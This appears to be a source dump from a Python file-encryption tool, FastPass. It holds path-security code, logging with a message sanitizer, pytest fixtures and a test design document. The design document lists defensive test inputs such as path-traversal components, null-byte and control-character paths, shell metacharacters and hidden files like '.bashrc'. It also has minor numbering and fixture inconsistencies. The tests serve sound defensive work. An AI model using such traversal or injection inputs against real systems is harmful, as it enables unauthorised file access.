            self._validate_path_components_strict(resolved_output)
            
            # Check if output directory is within allowed boundaries
            if not self._is_path_within_allowed_directories(resolved_output):
                raise SecurityViolationError(
                    f"Output directory outside security boundaries: {output_dir}"
                )
                
        except SecurityViolationError:
            # Re-raise security violations as-is
            raise
        except Exception as e:
            raise SecurityViolationError(f"Output directory path resolution failed: {output_dir} - {e}")
        
        # Create directory if it doesn't exist
        try:
            resolved_output.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            raise SecurityViolationError(f"Cannot create output directory: {output_dir}")
        
        return resolved_output
</file>

<file path="src/utils/logger.py">
"""
FastPass Logging Configuration
Maps to: A3a-A3e Enhanced Logging Setup with TTY Detection
"""

# A1a: Load System Tools
import logging
import sys
import os
from pathlib import Path
from datetime import datetime
from typing import Optional


def setup_logger(name: str = "fastpass", 
                debug: bool = False, 
                log_file: Optional[Path] = None) -> logging.Logger:
    """
    A3a: Configure Console and File Logging
    Detect TTY for appropriate log formatting
    Set up both console and optional file logging
    """
    logger = logging.getLogger(name)
    
    # Clear any existing handlers
    logger.handlers.clear()
    
    # Set log level
    logger.setLevel(logging.DEBUG if debug else logging.INFO)
    
    # A3b: Set Up TTY-Aware Progress Tracking
    # TTY: Full timestamp format for console display
    # Non-TTY: Simple format for file redirection
    is_tty = sys.stdout.isatty()
    
    if is_tty:
        # A3c: Initialize Multi-Handler Logger - TTY format
        console_format = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"
        date_format = "%Y-%m-%d %H:%M:%S"
    else:
        # Non-TTY: Simple format for file redirection
        console_format = "[%(levelname)s] %(message)s"
        date_format = None
    
    # Create console handler for INFO and DEBUG messages (stdout)
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_handler.addFilter(lambda record: record.levelno < logging.ERROR)
    console_formatter = logging.Formatter(console_format, datefmt=date_format)
    console_handler.setFormatter(console_formatter)
    logger.addHandler(console_handler)
    
    # Create separate handler for ERROR messages (stderr)
    error_handler = logging.StreamHandler(sys.stderr)
    error_handler.setLevel(logging.ERROR)
    error_formatter = logging.Formatter(console_format, datefmt=date_format)
    error_handler.setFormatter(error_formatter)
    logger.addHandler(error_handler)
    
    # A3c: Add file handler if --log-file specified
    if log_file:
        try:
            # Ensure log directory exists
            log_file.parent.mkdir(parents=True, exist_ok=True)
            
            file_handler = logging.FileHandler(log_file)
            file_format = "%(asctime)s [%(levelname)s] %(name)s:%(lineno)d: %(message)s"
            file_formatter = logging.Formatter(file_format, datefmt="%Y-%m-%d %H:%M:%S")
            file_handler.setFormatter(file_formatter)
            logger.addHandler(file_handler)
        except Exception as e:
            logger.warning(f"Could not create log file {log_file}: {e}")
    
    # A3e: Record Program Startup with Config
    logger.debug(f"FastPass logger initialized (TTY: {is_tty})")
    
    return logger


def sanitize_error_message(message: str) -> str:
    """
    E3a: Sanitize Error Messages
    Apply sanitize_error_message() to all errors
    Remove paths, passwords, sensitive patterns
    """
    import re
    
    # E3a_Sanitize: Pattern-Based Sanitization
    # Remove password=<value>, IP addresses, email addresses
    sanitized = message
    
    # Remove password patterns
    sanitized = re.sub(r'password[=:\s]+[^\s,]+', 'password=<REDACTED>', sanitized, flags=re.IGNORECASE)
    
    # Remove file paths (keep just filename)
    sanitized = re.sub(r'[A-Za-z]:[\\\/][^\\\/\s]*[\\\/]([^\\\/\s]+)', r'<path>/\1', sanitized)
    sanitized = re.sub(r'\/[^\/\s]*\/([^\/\s]+)', r'<path>/\1', sanitized)
    
    # Remove potential IP addresses
    sanitized = re.sub(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', '<IP_ADDRESS>', sanitized)
    
    # Remove email addresses
    sanitized = re.sub(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', '<EMAIL>', sanitized)
    
    return sanitized
</file>

<file path="tests/conftest.py">
"""
FastPass Comprehensive Test Configuration and Fixtures
PyTest configuration and shared fixtures for all test categories
"""

import pytest
import tempfile
import shutil
from pathlib import Path
import subprocess
import json
import os
from typing import Dict, List, Any

# Test markers for categorizing tests
pytest.mark.unit = pytest.mark.mark("unit", "Unit tests")
pytest.mark.integration = pytest.mark.mark("integration", "Integration tests") 
pytest.mark.e2e = pytest.mark.mark("e2e", "End-to-end tests")
pytest.mark.security = pytest.mark.mark("security", "Security tests")
pytest.mark.performance = pytest.mark.mark("performance", "Performance tests")

@pytest.fixture(scope="session")
def test_data_dir():
    """Fixture providing test data directory"""
    return Path(__file__).parent / "fixtures"

@pytest.fixture(scope="session") 
def sample_files_dir(test_data_dir):
    """Fixture providing sample files directory"""
    return test_data_dir / "sample_files"

@pytest.fixture
def temp_work_dir():
    """Fixture providing temporary working directory for each test"""
    temp_dir = tempfile.mkdtemp(prefix="fastpass_test_")
    yield Path(temp_dir)
    shutil.rmtree(temp_dir, ignore_errors=True)

@pytest.fixture
def fastpass_executable():
    """Fixture providing path to FastPass executable"""
    # Return the module path for running FastPass
    return ["uv", "run", "python", "-m", "src"]

@pytest.fixture
def simple_test_pdf(temp_work_dir):
    """Create a simple test PDF"""
    pdf_content = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj

4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Test PDF Content) Tj
ET
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000216 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
310
%%EOF"""
    
    test_pdf = temp_work_dir / "test.pdf"
    with open(test_pdf, 'w') as f:
        f.write(pdf_content)
    
    return test_pdf

@pytest.fixture
def password_list_file(temp_work_dir):
    """Fixture providing password list file"""
    password_file = temp_work_dir / "passwords.txt"
    passwords = [
        "password123",
        "secret456", 
        "complex&password!",
        "test with spaces",
        "unicode_пароль",
        "symbols@#$%^&*()",
        "verylongpasswordthatexceedsnormallimits1234567890"
    ]
    
    with open(password_file, 'w', encoding='utf-8') as f:
        for password in passwords:
            f.write(f"{password}\n")
    
    return password_file


@pytest.fixture(scope="session")
def project_root():
    """Fixture providing project root directory"""
    return Path(__file__).parent.parent


@pytest.fixture
def sample_pdf_file(temp_work_dir, project_root):
    """Fixture providing a sample PDF file for testing"""
    source_pdf = project_root / "dev" / "pdf" / "test1_docx.pdf"
    if source_pdf.exists():
        test_pdf = temp_work_dir / "test_sample.pdf"
        shutil.copy2(source_pdf, test_pdf)
        return test_pdf
    else:
        # Use the simple test PDF if real one not available
        return simple_test_pdf(temp_work_dir)


@pytest.fixture
def multiple_test_files(temp_work_dir, sample_pdf_file):
    """Fixture providing multiple test files for batch testing"""
    files = []
    
    if sample_pdf_file:
        files.append(sample_pdf_file)
        
        # Create additional test files by copying the PDF
        for i in range(3):
            additional_file = temp_work_dir / f"test_file_{i}.pdf"
            shutil.copy2(sample_pdf_file, additional_file)
            files.append(additional_file)
    
    return files


@pytest.fixture
def unsupported_test_files(temp_work_dir):
    """Fixture providing unsupported file formats for testing rejection"""
    files = {}
    
    # Create .txt file
    txt_file = temp_work_dir / "test.txt"
    txt_file.write_text("This is a text file that should be rejected")
    files["txt"] = txt_file
    
    # Create .doc file (fake - just rename a txt file)
    doc_file = temp_work_dir / "test.doc"
    doc_file.write_text("Fake legacy doc file")
    files["doc"] = doc_file
    
    return files


@pytest.fixture
def encrypted_test_files(temp_work_dir, sample_pdf_file, fastpass_executable, project_root):
    """Fixture providing pre-encrypted test files with known passwords"""
    encrypted_files = {}
    
    if sample_pdf_file and sample_pdf_file.exists():
        # Encrypt the PDF with a known password
        encrypted_pdf = temp_work_dir / "encrypted_sample.pdf"
        shutil.copy2(sample_pdf_file, encrypted_pdf)
        
        # Encrypt using FastPass
        result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", str(encrypted_pdf),
                "-p", "test123"
            ],
            capture_output=True,
            text=True,
            cwd=project_root
        )
        
        if result.returncode == 0:
            encrypted_files["pdf"] = {
                "file": encrypted_pdf,
                "password": "test123"
            }
    
    return encrypted_files


@pytest.fixture 
def cli_test_combinations():
    """Fixture providing comprehensive CLI argument combinations for testing"""
    operations = ["encrypt", "decrypt", "check-password"]
    input_methods = ["files", "recursive"]  
    password_sources = ["cli", "file", "none"]
    output_modes = ["inplace", "directory"]
    flags = [[], ["--dry-run"], ["--verify"], ["--debug"]]
    
    combinations = []
    for op in operations:
        for input_method in input_methods:
            # Recursive only allowed for decrypt and check-password
            if input_method == "recursive" and op == "encrypt":
                continue
                
            for password_source in password_sources:
                # Password required for encrypt and decrypt
                if password_source == "none" and op != "check-password":
                    continue
                    
                for output_mode in output_modes:
                    for flag_set in flags:
                        combinations.append({
                            "operation": op,
                            "input_method": input_method,
                            "password_source": password_source,
                            "output_mode": output_mode,
                            "flags": flag_set
                        })
    
    return combinations


# Helper functions for test utilities
def run_fastpass_command(fastpass_executable: List[str], args: List[str], cwd: Path = None, input_data: str = None) -> subprocess.CompletedProcess:
    """Run FastPass command and return result"""
    cmd = fastpass_executable + args
    return subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        cwd=cwd,
        input=input_data
    )
</file>

<file path="dev/fastpass_test_design.md">
# FastPass Comprehensive Test Design Document

## Overview

This document provides a **complete, detailed specification** of the actual implemented FastPass test suite. Every test method is documented with its exact purpose, implementation, and mapping to specific sections in the FastPass specification document.

**Testing Philosophy**: Test every single aspect of the program without exception. Every flowchart box, every function, every security validation, every user input scenario, and every error condition is covered by automated tests with specific section mappings.

**Document Accuracy**: This document describes the **actual implemented test suite** as of the current state. Every test listed here exists in the codebase and is executable.

---

## Test Directory Structure (Implemented)

```
tests/
├── conftest.py                          # Comprehensive test configuration and fixtures
├── unit/                               # Unit tests (isolated component testing)
│   ├── __init__.py
│   ├── test_cli_parsing.py             # 46 tests - CLI argument parsing and validation
│   └── test_security_validation.py     # 44 tests - Security hardening functions
├── e2e/                                # End-to-end tests (full program execution)
│   └── test_complete_workflows.py      # 23 tests - Complete workflow scenarios
├── security/                           # Security attack simulation tests
│   └── test_attack_simulation.py       # 23 tests - Real attack scenario prevention
├── integration/                        # Integration tests (ready for expansion)
│   └── __init__.py
├── performance/                        # Performance tests (ready for expansion)
│   └── __init__.py
└── fixtures/                          # Test data and sample files
    ├── __init__.py
    ├── sample_files/
    ├── password_lists/
    ├── malicious/
    └── expected_outputs/
```

**Total Implemented Tests: 136 comprehensive test methods**

---

## Unit Tests - CLI Parsing and Validation (46 Tests)

**File**: `tests/unit/test_cli_parsing.py`  
**Specification Mapping**: Section A - CLI Parsing & Initialization  
**Coverage**: All A1-A5 subsections with comprehensive validation

### TestCLIArgumentParsing (16 Tests)
*Maps to: A1 - COMMAND LINE ARGUMENT PARSING*

#### A1a-A1b: Basic Operation Parsing
1. **`test_parse_encrypt_basic()`** - **[A1a, A1b]**
   - **Purpose**: Verify basic encrypt operation argument parsing
   - **Test**: `['fast_pass', 'encrypt', '-i', 'test.pdf', '-p', 'password']`
   - **Validation**: `args.operation == 'encrypt'`, correct input/password parsing
   - **Coverage**: Basic parser initialization and operation mode selection

2. **`test_parse_decrypt_basic()`** - **[A1a, A1b]**
   - **Purpose**: Verify basic decrypt operation argument parsing
   - **Test**: `['fast_pass', 'decrypt', '-i', 'test.pdf', '-p', 'password']`
   - **Validation**: `args.operation == 'decrypt'`, correct input/password parsing
   - **Coverage**: Alternative operation mode validation

3. **`test_parse_check_password_basic()`** - **[A1a, A1b]**
   - **Purpose**: Verify check-password operation argument parsing
   - **Test**: `['fast_pass', 'check-password', '-i', 'test.pdf']`
   - **Validation**: `args.operation == 'check-password'`, no password required
   - **Coverage**: Third operation mode with different parameter requirements

#### A1c: File Input Options
4. **`test_parse_multiple_files()`** - **[A1c]**
   - **Purpose**: Verify multiple file input parsing
   - **Test**: `['-i', 'file1.pdf', 'file2.docx', 'file3.xlsx', '-p', 'password']`
   - **Validation**: `args.input == [Path('file1.pdf'), Path('file2.docx'), Path('file3.xlsx')]`
   - **Coverage**: Multiple file specification handling

5. **`test_parse_files_with_spaces()`** - **[A1c]**
   - **Purpose**: Verify file paths with spaces are handled correctly
   - **Test**: `['-i', 'file with spaces.pdf', '-p', 'password']`
   - **Validation**: Correct path parsing with embedded spaces
   - **Coverage**: Special character handling in file paths

#### A1d: Password Options with Space-Delimited Support
6. **`test_parse_multiple_passwords()`** - **[A1d]**
   - **Purpose**: Verify multiple password parsing
   - **Test**: `['-p', 'pass1', 'pass2', 'pass3']`
   - **Validation**: `args.password == ['pass1', 'pass2', 'pass3']`
   - **Coverage**: Space-delimited password support

7. **`test_parse_passwords_with_spaces()`** - **[A1d]**
   - **Purpose**: Verify passwords containing spaces
   - **Test**: `['-p', 'password with spaces', 'another password']`
   - **Validation**: Correct parsing of quoted passwords with spaces
   - **Coverage**: Complex password string handling

8. **`test_parse_password_list_file()`** - **[A1d]**
   - **Purpose**: Verify password list file option parsing
   - **Test**: `['--password-list', 'passwords.txt']`
   - **Validation**: `args.password_list == Path('passwords.txt')`
   - **Coverage**: Alternative password input method

#### A1c: Recursive Mode (Decrypt/Check-Password Only)
9. **`test_parse_recursive_mode()`** - **[A1c]**
   - **Purpose**: Verify recursive directory processing option
   - **Test**: `['decrypt', '-r', '/path/to/dir', '-p', 'password']`
   - **Validation**: `args.recursive == Path('/path/to/dir')`
   - **Coverage**: Directory-based processing mode

#### A1e: Output Options
10. **`test_parse_output_directory()`** - **[A1e]**
    - **Purpose**: Verify output directory specification
    - **Test**: `['-o', '/output/dir']`
    - **Validation**: `args.output_dir == Path('/output/dir')`
    - **Coverage**: Non-default output location handling

#### A1f: Utility Options
11. **`test_parse_dry_run_flag()`** - **[A1f]**
    - **Purpose**: Verify dry-run mode flag parsing
    - **Test**: `['--dry-run']`
    - **Validation**: `args.dry_run is True`
    - **Coverage**: Testing mode without actual operations

12. **`test_parse_verify_flag()`** - **[A1f]**
    - **Purpose**: Verify verification mode flag parsing
    - **Test**: `['--verify']`
    - **Validation**: `args.verify is True`
    - **Coverage**: Deep file validation mode

13. **`test_parse_debug_flag()`** - **[A1f]**
    - **Purpose**: Verify debug logging flag parsing
    - **Test**: `['--debug']`
    - **Validation**: `args.debug is True`
    - **Coverage**: Enhanced logging configuration

14. **`test_parse_log_file()`** - **[A1f]**
    - **Purpose**: Verify log file specification
    - **Test**: `['--log-file', 'app.log']`
    - **Validation**: `args.log_file == Path('app.log')`
    - **Coverage**: Custom log file location

15. **`test_parse_combined_flags()`** - **[A1f]**
    - **Purpose**: Verify multiple utility flags can be combined
    - **Test**: `['--dry-run', '--verify', '--debug']`
    - **Validation**: All flags are True simultaneously
    - **Coverage**: Flag combination compatibility

#### A1g: Information Display Options
16. **`test_parse_list_supported()`** - **[A1g]**
    - **Purpose**: Verify supported formats listing option
    - **Test**: `['--list-supported']`
    - **Validation**: `args.list_supported is True`
    - **Coverage**: Information-only operation mode

### TestCLIArgumentValidation (15 Tests)
*Maps to: A2 - ARGUMENT VALIDATION AND NORMALIZATION*

#### A2a: Input Requirements Validation
17. **`test_validate_encrypt_basic_valid()`** - **[A2a]**
    - **Purpose**: Verify valid encrypt arguments pass validation
    - **Test**: Complete valid encrypt argument set
    - **Validation**: No exception raised during validation
    - **Coverage**: Positive validation path for encrypt operation

18. **`test_validate_decrypt_basic_valid()`** - **[A2a]**
    - **Purpose**: Verify valid decrypt arguments pass validation
    - **Test**: Complete valid decrypt argument set
    - **Validation**: No exception raised during validation
    - **Coverage**: Positive validation path for decrypt operation

19. **`test_validate_check_password_no_password_valid()`** - **[A2a]**
    - **Purpose**: Verify check-password without password is valid
    - **Test**: check-password with files but no password
    - **Validation**: No exception raised (password optional for check-password)
    - **Coverage**: Operation-specific validation rules

#### A2a: Missing Required Components
20. **`test_validate_no_operation_error()`** - **[A2a]**
    - **Purpose**: Verify missing operation triggers error
    - **Test**: Arguments with files/password but no operation
    - **Validation**: `ValueError` with "Must specify an operation"
    - **Coverage**: Required operation enforcement

21. **`test_validate_no_input_files_error()`** - **[A2a]**
    - **Purpose**: Verify missing input files triggers error
    - **Test**: Operation and password but no input files
    - **Validation**: `ValueError` with "Must specify either files"
    - **Coverage**: Required input specification

22. **`test_validate_no_password_encrypt_error()`** - **[A2a]**
    - **Purpose**: Verify encrypt without password triggers error
    - **Test**: Encrypt operation with files but no password
    - **Validation**: `ValueError` with "Must specify passwords"
    - **Coverage**: Operation-specific password requirements

23. **`test_validate_no_password_decrypt_error()`** - **[A2a]**
    - **Purpose**: Verify decrypt without password triggers error
    - **Test**: Decrypt operation with files but no password
    - **Validation**: `ValueError` with "Must specify passwords"
    - **Coverage**: Password requirement enforcement for decrypt

#### A2a: Input Method Conflicts
24. **`test_validate_conflicting_input_methods_error()`** - **[A2a]**
    - **Purpose**: Verify both files and recursive triggers error
    - **Test**: Both `-i files` and `-r directory` specified
    - **Validation**: `ValueError` with "Cannot specify both individual files and recursive"
    - **Coverage**: Mutually exclusive input method enforcement

#### A2a1: Recursive Mode Security Restrictions
25. **`test_validate_recursive_encrypt_blocked()`** - **[A2a1]**
    - **Purpose**: Verify recursive mode blocked for encrypt operation
    - **Test**: Encrypt operation with recursive directory
    - **Validation**: `ValueError` with "Recursive mode only supported for decrypt"
    - **Coverage**: Security restriction on recursive encryption

26. **`test_validate_recursive_decrypt_allowed()`** - **[A2a1]**
    - **Purpose**: Verify recursive mode allowed for decrypt operation
    - **Test**: Decrypt operation with recursive directory
    - **Validation**: No exception raised
    - **Coverage**: Permitted recursive operation

27. **`test_validate_recursive_check_password_allowed()`** - **[A2a1]**
    - **Purpose**: Verify recursive mode allowed for check-password operation
    - **Test**: Check-password operation with recursive directory
    - **Validation**: No exception raised
    - **Coverage**: Permitted recursive operation validation

#### Special Case Validation
28. **`test_validate_list_supported_skips_validation()`** - **[A2a]**
    - **Purpose**: Verify --list-supported bypasses other validation
    - **Test**: --list-supported with incomplete other arguments
    - **Validation**: No exception raised despite missing required arguments
    - **Coverage**: Information command special handling

### TestCLIPasswordHandling (4 Tests)
*Maps to: A3c - Handle TTY detection and stdin password input*

#### A3c: Stdin Password Processing
29. **`test_handle_stdin_passwords_no_stdin()`** - **[A3c]**
    - **Purpose**: Verify normal password handling without stdin
    - **Test**: Regular password list without 'stdin' keyword
    - **Validation**: Passwords unchanged, no stdin mapping created
    - **Coverage**: Standard password processing path

30. **`test_handle_stdin_passwords_valid_json()`** - **[A3c]**
    - **Purpose**: Verify valid JSON stdin password processing
    - **Test**: Password list with 'stdin' + valid JSON input
    - **Validation**: JSON parsed into `stdin_password_mapping`, 'stdin' removed from password list
    - **Coverage**: JSON password mapping creation

31. **`test_handle_stdin_passwords_invalid_json()`** - **[A3c]**
    - **Purpose**: Verify invalid JSON triggers appropriate error
    - **Test**: 'stdin' keyword with malformed JSON
    - **Validation**: `ValueError` with "Invalid JSON in stdin"
    - **Coverage**: JSON parsing error handling

32. **`test_handle_stdin_passwords_empty_stdin()`** - **[A3c]**
    - **Purpose**: Verify empty stdin input handling
    - **Test**: 'stdin' keyword with empty input
    - **Validation**: 'stdin' removed, no mapping created
    - **Coverage**: Edge case handling for empty input

### TestCLIInformationDisplay (2 Tests)
*Maps to: A1g - Information Display Functions*

#### A1g: Information Command Processing
33. **`test_display_supported_formats()`** - **[A1g]**
    - **Purpose**: Verify supported formats display output
    - **Test**: Call display_information_and_exit with list_supported=True
    - **Validation**: Output contains format lists (.pdf, .docx, .xlsx, .pptx), returns 0
    - **Coverage**: Format information display functionality

34. **`test_display_no_information_request()`** - **[A1g]**
    - **Purpose**: Verify no information request returns normally
    - **Test**: Call with list_supported=False
    - **Validation**: Returns 0 without output
    - **Coverage**: Normal execution path without information display

### TestCLIMainFunction (7 Tests)
*Maps to: A5 - FASTPASS APPLICATION CLASS and overall error handling*

#### A5: Application Integration and Error Handling
35. **`test_main_help_display()`** - **[A5]**
    - **Purpose**: Verify --help flag triggers help display and exit
    - **Test**: sys.argv = ['fast_pass', '--help']
    - **Validation**: SystemExit with code 0
    - **Coverage**: Help system integration

36. **`test_main_version_display()`** - **[A5]**
    - **Purpose**: Verify --version flag triggers version display and exit
    - **Test**: sys.argv = ['fast_pass', '--version']
    - **Validation**: SystemExit with code 0
    - **Coverage**: Version display integration

37. **`test_main_list_supported_formats()`** - **[A5]**
    - **Purpose**: Verify --list-supported produces correct output
    - **Test**: Full main() execution with --list-supported
    - **Validation**: Return code 0, output contains "FastPass Supported File Formats"
    - **Coverage**: Information command full execution path

38. **`test_main_invalid_arguments_error()`** - **[A5]**
    - **Purpose**: Verify invalid arguments return appropriate error code
    - **Test**: Incomplete arguments (encrypt without required parameters)
    - **Validation**: Return code 2, error message in stderr
    - **Coverage**: Argument validation error propagation

39. **`test_main_keyboard_interrupt()`** - **[A5]**
    - **Purpose**: Verify Ctrl+C handling in main application
    - **Test**: KeyboardInterrupt during application execution
    - **Validation**: Return code 1, "Operation cancelled by user" message
    - **Coverage**: Signal handling and graceful shutdown

40. **`test_main_unexpected_error()`** - **[A5]**
    - **Purpose**: Verify unexpected errors handled gracefully
    - **Test**: RuntimeError during application execution
    - **Validation**: Return code 2, "Unexpected error" message
    - **Coverage**: General exception handling and error reporting

### TestCLIEdgeCases (6 Tests)
*Maps to: A1-A5 - Edge Case Handling Across All CLI Functions*

#### Edge Case and Boundary Testing
41. **`test_empty_password_list()`** - **[A1d]**
    - **Purpose**: Verify empty password arguments handled appropriately
    - **Test**: `-p` flag without password arguments
    - **Validation**: SystemExit from argparse (expected behavior)
    - **Coverage**: Boundary condition for password specification

42. **`test_very_long_arguments()`** - **[A1, A2]**
    - **Purpose**: Verify extremely long arguments don't break parsing
    - **Test**: 1000-character filename and password
    - **Validation**: Arguments parsed correctly without truncation
    - **Coverage**: Buffer overflow prevention and large input handling

43. **`test_unicode_arguments()`** - **[A1, A2]**
    - **Purpose**: Verify Unicode file paths and passwords work
    - **Test**: Cyrillic characters in filename and password
    - **Validation**: Unicode preserved correctly in parsed arguments
    - **Coverage**: International character support

44. **`test_special_characters_in_paths()`** - **[A1c]**
    - **Purpose**: Verify special characters in file paths are preserved
    - **Test**: Filename with $, &, @, ! characters
    - **Validation**: Special characters preserved in parsing
    - **Coverage**: Shell metacharacter handling safety

45. **`test_relative_vs_absolute_paths()`** - **[A1c]**
    - **Purpose**: Verify both relative and absolute paths work
    - **Test**: Mix of relative and absolute file paths
    - **Validation**: Path types correctly identified and preserved
    - **Coverage**: Path resolution flexibility

---

## Unit Tests - Security Validation (44 Tests)

**File**: `tests/unit/test_security_validation.py`  
**Specification Mapping**: Section B - Security & File Validation  
**Coverage**: All B1-B5 subsections with comprehensive security hardening

### TestSecurityValidatorInitialization (6 Tests)
*Maps to: B1 - FILE PATH RESOLUTION AND SECURITY VALIDATION (Setup)*

#### B1: Security Boundary Establishment
46. **`test_security_validator_init()`** - **[B1]**
    - **Purpose**: Verify SecurityValidator initializes correctly
    - **Test**: Create SecurityValidator instance with logger
    - **Validation**: Logger assigned, allowed_directories set populated
    - **Coverage**: Security system initialization

47. **`test_allowed_directories_includes_home()`** - **[B1]**
    - **Purpose**: Verify home directory included in security boundaries
    - **Test**: Check allowed_directories after initialization
    - **Validation**: User home directory present in allowed set
    - **Coverage**: Home directory security boundary setup

48. **`test_allowed_directories_includes_temp()`** - **[B1]**
    - **Purpose**: Verify temp directory included for testing operations
    - **Test**: Check allowed_directories for system temp directory
    - **Validation**: System temp directory present in allowed set
    - **Coverage**: Temporary file processing security allowance

49. **`test_allowed_directories_includes_cwd()`** - **[B1]**
    - **Purpose**: Verify current working directory included by default
    - **Test**: Check allowed_directories for current working directory
    - **Validation**: Current working directory present in allowed set
    - **Coverage**: Project directory access enablement

50. **`test_custom_allowed_directories()`** - **[B1]**
    - **Purpose**: Verify custom allowed directories configuration works
    - **Test**: Initialize SecurityValidator with custom allowed directories
    - **Validation**: Only custom directories and temp directory are allowed
    - **Coverage**: Configurable security boundary implementation

### TestPathResolutionValidation (3 Tests)
*Maps to: B1b, B1c - Path resolution and normalization*

#### B1b-B1c: Basic Path Resolution and Security Validation
49. **`test_validate_existing_file_path()`** - **[B1b, B1c]**
    - **Purpose**: Verify valid existing files pass security validation
    - **Test**: Create real file in temp directory, validate path
    - **Validation**: Returns resolved path without raising exception
    - **Coverage**: Normal file access validation success path

50. **`test_validate_nonexistent_file_error()`** - **[B1c]**
    - **Purpose**: Verify nonexistent files trigger security error
    - **Test**: Attempt to validate path to nonexistent file
    - **Validation**: `SecurityViolationError` with "File not found"
    - **Coverage**: File existence validation enforcement

51. **`test_validate_path_expansion()`** - **[B1b]**
    - **Purpose**: Verify tilde expansion works correctly
    - **Test**: Path with user directory expansion
    - **Validation**: Returned path is absolute after expansion
    - **Coverage**: Path normalization and expansion handling

### TestSymlinkDetection (2 Tests)
*Maps to: B1c - Security validation with symlink protection*

#### B1c: Symlink Detection and Blocking
52. **`test_validate_symlink_file_blocked()`** - **[B1c]**
    - **Purpose**: Verify symbolic link files are blocked
    - **Test**: Create symlink to real file, attempt validation
    - **Validation**: `SecurityViolationError` with "Symbolic links are not allowed"
    - **Coverage**: Direct symlink attack prevention

53. **`test_validate_symlink_parent_directory_blocked()`** - **[B1c]**
    - **Purpose**: Verify files in symlinked directories are blocked
    - **Test**: Create symlinked directory, attempt to access file through it
    - **Validation**: `SecurityViolationError` with "Path contains symbolic link"
    - **Coverage**: Indirect symlink attack prevention through directory chain

### TestPathLengthValidation (2 Tests)
*Maps to: B1c - Path length security validation*

#### B1c: Path Length Security Validation
54. **`test_validate_normal_path_length()`** - **[B1c]**
    - **Purpose**: Verify normal length paths pass validation
    - **Test**: Standard length file path validation
    - **Validation**: No exception raised for normal paths
    - **Coverage**: Normal path length acceptance

55. **`test_validate_very_long_path_blocked()`** - **[B1c]**
    - **Purpose**: Verify extremely long paths are blocked
    - **Test**: Path exceeding 260 characters (Windows MAX_PATH)
    - **Validation**: `SecurityViolationError` with "Path too long"
    - **Coverage**: Buffer overflow and path length attack prevention

### TestPathCharacterValidation (3 Tests)
*Maps to: B1c - Character-level security validation*

#### B1c: Dangerous Character Detection
56. **`test_validate_null_byte_blocked()`** - **[B1c]**
    - **Purpose**: Verify null bytes in paths are blocked
    - **Test**: Path containing \x00 null byte
    - **Validation**: `SecurityViolationError` with "null bytes or control characters"
    - **Coverage**: Null byte injection attack prevention

57. **`test_validate_control_characters_blocked()`** - **[B1c]**
    - **Purpose**: Verify control characters in paths are blocked
    - **Test**: Path containing control character \x01
    - **Validation**: `SecurityViolationError` with "null bytes or control characters"
    - **Coverage**: Control character injection prevention

58. **`test_validate_normal_characters_allowed()`** - **[B1c]**
    - **Purpose**: Verify normal characters are allowed
    - **Test**: Path with standard alphanumeric and safe characters
    - **Validation**: No exception raised for normal characters
    - **Coverage**: Normal character set acceptance

### TestDirectoryContainmentValidation (3 Tests)
*Maps to: B2b - Path Within Security Boundaries validation*

#### B2b: Security Boundary Enforcement
59. **`test_validate_file_in_allowed_directory()`** - **[B2b]**
    - **Purpose**: Verify files in allowed directories pass validation
    - **Test**: File in temp directory (allowed)
    - **Validation**: Validation passes without exception
    - **Coverage**: Allowed directory access confirmation

60. **`test_validate_file_outside_allowed_directories_blocked()`** - **[B2b]**
    - **Purpose**: Verify files outside allowed directories are blocked
    - **Test**: System files outside allowed boundaries
    - **Validation**: `SecurityViolationError` with "outside security boundaries"
    - **Coverage**: Directory containment enforcement

61. **`test_containment_check_exact_boundary()`** - **[B2b]**
    - **Purpose**: Verify boundary condition handling
    - **Test**: File at directory boundary
    - **Validation**: Correct handling of exact boundary conditions
    - **Coverage**: Edge case validation for directory boundaries

### TestPathComponentValidation (11 Tests)
*Maps to: B2c - Check Each Path Element*

#### B2c: Individual Path Component Safety
62. **`test_validate_safe_path_components()`** - **[B2c]**
    - **Purpose**: Verify safe path components pass validation
    - **Test**: Array of safe component names
    - **Validation**: All safe components return True from safety check
    - **Coverage**: Normal component acceptance criteria

63. **`test_validate_path_traversal_components_blocked()`** - **[B2c]**
    - **Purpose**: Verify path traversal components are blocked
    - **Test**: Components like "..", "~", "../", "..\"
    - **Validation**: All dangerous patterns return False from safety check
    - **Coverage**: Path traversal attack prevention

64. **`test_validate_windows_reserved_names_blocked()`** - **[B2c]**
    - **Purpose**: Verify Windows reserved names are blocked
    - **Test**: CON, PRN, AUX, NUL, COM1-COM9, LPT1-LPT9
    - **Validation**: All reserved names return False (case insensitive)
    - **Coverage**: Windows system name collision prevention

65. **`test_validate_hidden_files_blocked()`** - **[B2c]**
    - **Purpose**: Verify hidden files (starting with .) are blocked
    - **Test**: Files like ".hidden_file", ".secret", ".bashrc"
    - **Validation**: Hidden files return False, "." (current dir) allowed
    - **Coverage**: Hidden file access prevention with system exception

66. **`test_validate_dangerous_characters_blocked()`** - **[B2c]**
    - **Purpose**: Verify dangerous characters in components are blocked
    - **Test**: Components containing <, >, ", |, ?, *
    - **Validation**: All dangerous character combinations return False
    - **Coverage**: Shell metacharacter and filesystem-unsafe character prevention

67. **`test_validate_windows_drive_letters_allowed()`** - **[B2c]**
    - **Purpose**: Verify Windows drive letters are allowed
    - **Test**: Drive letters C:, D:, E:, Z:
    - **Validation**: All drive letters return True
    - **Coverage**: Windows filesystem compatibility

68. **`test_validate_excessively_long_components_blocked()`** - **[B2c]**
    - **Purpose**: Verify excessively long path components are blocked
    - **Test**: Component > 255 characters, component = 255 characters
    - **Validation**: >255 blocked, =255 allowed
    - **Coverage**: Filesystem component length limit enforcement

